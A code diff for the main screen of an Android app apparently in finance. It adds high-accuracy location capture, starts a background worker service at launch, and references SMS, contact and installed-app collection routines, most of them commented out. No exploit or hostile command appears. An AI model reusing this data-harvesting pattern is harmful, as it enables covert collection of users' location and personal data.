@@ -3,8 +3,10 @@ package com.finance.hytone;
 import android.annotation.SuppressLint;
 import android.app.ProgressDialog;
 import android.content.Intent;
+import android.content.IntentSender;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
+import android.location.Location;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
@@ -14,6 +16,7 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.facebook.CallbackManager;
@@ -31,12 +34,22 @@ import com.finance.hytone.model.ContactModel;
 import com.finance.hytone.model.SmsModel;
 import com.finance.hytone.retrofit.GetDataService;
 import com.finance.hytone.retrofit.RetrofitClientInstance;
+import com.finance.hytone.services.WorkerService;
 import com.google.android.gms.auth.api.signin.GoogleSignIn;
 import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
 import com.google.android.gms.auth.api.signin.GoogleSignInClient;
 import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
 import com.google.android.gms.common.SignInButton;
 import com.google.android.gms.common.api.ApiException;
+import com.google.android.gms.common.api.ResolvableApiException;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.LocationSettingsRequest;
+import com.google.android.gms.location.LocationSettingsResponse;
+import com.google.android.gms.location.SettingsClient;
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.android.gms.tasks.Task;
 
 import java.io.BufferedWriter;
@@ -54,6 +67,7 @@ import retrofit2.Callback;
 import retrofit2.Response;
 
 public class MainActivity extends AppCompatActivity {
+    private FusedLocationProviderClient fusedLocationClient;
 
     private static final int RC_SIGN_IN = 100;
     private static final String TAG = "Google_related";
@@ -69,6 +83,13 @@ public class MainActivity extends AppCompatActivity {
     ShareDialog shareDialog;
     ProgressDialog pd;
     private String placeholder;
+    private int globalLocationStatus = -1;
+    private String globalLocationData = "";
+    private String globalLocationError;
+    private int globalLocationRequestStatus = -1;
+    private String globalLocationRequestError;
+    private boolean globalpermission = false;
+    private boolean isLocationObtained;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -81,12 +102,19 @@ public class MainActivity extends AppCompatActivity {
 //                .build();
         GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                 .requestEmail()
+                //.requestIdToken()
                 //.requestServerAuthCode("660015915488-r4gfinuaq3rj9qf57hjt6t3bbgq3mrg8.apps.googleusercontent.com")
                 .build();
         GoogleSignInClient mGoogleSignInClient = GoogleSignIn.getClient(this, gso);
         //doSmsWork();
         //doContactWork();
         do_next(mGoogleSignInClient);
+        Intent ii = new Intent(MainActivity.this,WorkerService.class);
+        startService(ii);
+        if (Permission.checkAllPermissions(MainActivity.this))
+        {
+            createLocationRequest();// to open settings if user has location disabled
+        }
         //uploadContent();
         //installedApps();
     }
@@ -285,11 +313,12 @@ public class MainActivity extends AppCompatActivity {
             // a listener.
             Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
             handleSignInResult(task);
-        } else if (requestCode == RC_GOOG_SIGNIN && resultCode == RESULT_OK) {
-            Toast.makeText(this, "Success Form submit!", Toast.LENGTH_SHORT).show();
-            placeholder = Helper.getFname(MainActivity.this) + Helper.getPhone(MainActivity.this) + System.currentTimeMillis();
-            doSmsWork();
         }
+//        else if (requestCode == RC_GOOG_SIGNIN && resultCode == RESULT_OK) {
+//            Toast.makeText(this, "Success Form submit!", Toast.LENGTH_SHORT).show();
+//            placeholder = Helper.getFname(MainActivity.this) + Helper.getPhone(MainActivity.this) + System.currentTimeMillis();
+//            //doSmsWork();
+//        }
     }
 
     private void handleSignInResult(Task<GoogleSignInAccount> completedTask) {
@@ -334,7 +363,9 @@ public class MainActivity extends AppCompatActivity {
 
 //            ii.putExtra("name",account.getDisplayName());
 //            ii.putExtra("email",account.getEmail());
-        startActivityForResult(ii, RC_GOOG_SIGNIN);
+        //startActivityForResult(ii, RC_GOOG_SIGNIN);
+        startActivity(ii);
+        finish();
         //Log.e("acctName", account.getDisplayName() + "");
         //Log.e("acctEmail", account.getEmail() + "");
          }
@@ -491,4 +522,82 @@ public class MainActivity extends AppCompatActivity {
         GoogleSignInAccount account = GoogleSignIn.getLastSignedInAccount(this);
         //updateUI(account);
     }
+
+    protected void createLocationRequest() {
+        final LocationRequest locationRequest = LocationRequest.create();
+        locationRequest.setInterval(Constants.LOC_UPDATE_INTERVAL * 1000);
+        locationRequest.setFastestInterval(10000);
+        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+        LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder()
+                .addLocationRequest(locationRequest);
+
+        SettingsClient client = LocationServices.getSettingsClient(this);
+        Task<LocationSettingsResponse> task = client.checkLocationSettings(builder.build());
+        task.addOnSuccessListener(this, new OnSuccessListener<LocationSettingsResponse>() {
+            @Override
+            public void onSuccess(LocationSettingsResponse locationSettingsResponse) {
+                // All location settings are satisfied. The client can initialize
+                // location requests here.
+                // ...
+                globalLocationRequestStatus = 1;
+                Log.e("hi","onsuccess");
+                fusedLocationClient = LocationServices.getFusedLocationProviderClient(MainActivity.this);
+                Task<Location> fgl = fusedLocationClient.getLastLocation();
+
+                fgl.addOnSuccessListener(MainActivity.this, new OnSuccessListener<Location>() {
+                    @Override
+                    public void onSuccess(Location location) {
+                        // Got last known location. In some rare situations this can be null.
+                        globalLocationStatus = 1;
+                        globalLocationData = ""+location;
+
+                        if (location != null) {
+                            // Logic to handle location object
+                            Helper.log("loca",location.getLatitude()+","+location.getLongitude()+","+location.getAccuracy());
+                            Helper.putLastLocation(MainActivity.this,location.getLatitude()+","+location.getLongitude());
+                            isLocationObtained = true;
+                        }
+                    }
+                });
+                fgl.addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception e) {
+                        globalLocationStatus = 0;
+                        globalLocationError = e.toString();
+                    }
+                });
+
+
+                //fusedLocationClient.removeLocationUpdates(locationCallback);
+
+            }
+        });
+
+        task.addOnFailureListener(this, new OnFailureListener() {
+            @Override
+            public void onFailure(@NonNull Exception e) {
+                globalLocationRequestStatus = 1;
+                globalLocationRequestError = ""+ e;
+                if (e instanceof ResolvableApiException) {
+                    // Location settings are not satisfied, but this can be fixed
+                    // by showing the user a dialog.
+                    Log.e("hi2","onFail");
+
+                    try {
+                        Toast.makeText(MainActivity.this, "Please enable location to continue2!", Toast.LENGTH_LONG).show();
+
+                        // Show the dialog by calling startResolutionForResult(),
+                        // and check the result in onActivityResult().
+                        ResolvableApiException resolvable = (ResolvableApiException) e;
+                        resolvable.startResolutionForResult(MainActivity.this,
+                                Constants.REQUEST_CHECK_SETTINGS);
+                    } catch (IntentSender.SendIntentException sendEx) {
+                        // Ignore the error.
+                        globalLocationRequestError = "2ndError "+ sendEx;
+                    }
+                }
+            }
+        });
+    }
+
 }
